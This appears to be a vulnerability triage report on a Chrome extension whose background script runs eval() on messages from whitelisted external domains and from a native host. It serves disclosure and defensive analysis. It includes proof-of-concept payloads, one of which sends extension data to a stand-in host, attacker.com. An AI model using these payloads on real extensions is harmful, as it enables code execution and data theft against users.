# CoCo Analysis: bdlhpbalhdjobabgbacbgclpjjelainj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
CoCo reported the flow from bg_external_port_onMessage to eval_sink but did not provide specific line numbers in the trace. Analysis of the actual extension code reveals the vulnerability.

**Code:**

```javascript
// Background script (bg.js, lines 967-1036, 1037-1049, 1072-1080)

// Function that handles messages from external websites
function onWebMessage(id, ext2helper) {
    return function (message) {
        var obj = eval(message), cmd = obj.cmd, port = obj.port; // ← EVAL SINK with attacker-controlled message
        console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);

        // Command handling logic
        if (cmd === 'e_play') {
            // ... play handling
        } else if (cmd === 'e_stop_success') {
            // ... stop handling
        } else if (cmd === 'e_multi_inst') {
            // ... multi instance handling
        } else if (cmd === 'e_inst_cnt') {
            // ... instance count handling
        } else if (cmd === 'moduleCrashed') {
            // ... crash handling
        } else {
            try {
                ext2helper.postMessage(obj); // Forward to native messaging
            }
            catch (e) {
                console.log(e);
            }
        }
    }
}

// Function that handles messages from native host
function onNativeMessage(id, ext2web) {
    return function (message) {
        var obj = eval(message); // ← EVAL SINK with message from native host
        var port = obj.port;
        var brandVersion = obj.brandVersion;
        console.log('ID = ' + id + ' get port = ' + port + ' get brand version = ' + brandVersion);
        obj.type = 'message';
        try { ext2web.postMessage(obj); } catch (e) { console.log(e); }
    }
}

// External connection listener - ENTRY POINT
chrome.runtime.onConnectExternal.addListener(function (connect) { // ← Allows external connections
    var Ext2Web = connect;
    appPorts[++count] = {web: Ext2Web};
    var Ext2Helper = chrome.runtime.connectNative("com.minervanetworks.chrome.plugin.helper");
    Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper)); // ← Attacker messages flow to onWebMessage
    Ext2Web.onDisconnect.addListener(onDisconnectedFromWeb(count, Ext2Helper));
    Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
    Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});

// Whitelisted domains in manifest.json externally_connectable:
// - *.minerva.net, *.m10tv.com, *.minervanetworks.com, *.cvattv.com.ar,
// - *.cablevisionflow.com.ar, *.cablevision.ar, *.gothamnetwork.com,
// - *.rev2go.com, *.mooo.com, *.entel.bo, localhost
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External port connection from whitelisted domains (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From any whitelisted domain (e.g., *.minerva.net, *.mooo.com, etc.)
// or compromised subdomain of whitelisted domains

// Establish external connection
var port = chrome.runtime.connect("EXTENSION_ID_HERE");

// Send malicious message with arbitrary JavaScript code
port.postMessage("({cmd: 'arbitrary', __proto__: {}, constructor: {constructor: function(){return window.alert('XSS')}()}})");

// Or more directly:
port.postMessage("(function(){alert(document.cookie); return {cmd:'test'}})()");

// Or exfiltrate data:
port.postMessage("(function(){fetch('https://attacker.com/steal?data='+JSON.stringify(chrome)); return {cmd:'test'}})()");

// The message string is passed directly to eval(), executing arbitrary JavaScript
```

**Impact:** Arbitrary JavaScript code execution in the extension's background context. An attacker controlling or compromising any of the whitelisted domains (or their subdomains) can execute arbitrary code in the extension's privileged context. This allows the attacker to:
1. Access all extension APIs and permissions (nativeMessaging)
2. Communicate with the native application (com.minervanetworks.chrome.plugin.helper)
3. Exfiltrate sensitive data from the extension
4. Manipulate extension behavior
5. Potentially pivot to compromise the native application through the native messaging interface

The use of eval() on untrusted external input is a critical security vulnerability.
